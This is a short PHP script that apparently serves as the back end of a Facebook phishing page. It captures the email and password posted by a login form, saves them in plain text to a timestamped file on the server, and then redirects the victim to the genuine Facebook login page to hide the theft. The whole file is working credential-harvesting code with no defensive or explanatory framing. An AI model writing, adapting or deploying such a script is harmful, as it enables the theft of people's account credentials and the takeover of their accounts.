<?php
	error_reporting(0);
	date_default_timezone_set("Asia/Dhaka");

	if ( isset($_POST['login']) and $_POST['login'] == '1' ) {
		$user = $_POST['email'];
		$pass = $_POST['pass'];
		$loginInfo = "Username = '$user' & Password = '$pass'";
		$fileName = date("d.m.Y") . '--' . date('H.i.s') . '.txt';
		$fw = fopen($fileName, "wb");
		fwrite($fw, $loginInfo);
		fclose($fw);

		header("Location: https://www.facebook.com/login.php");
		exit();
	}
?>
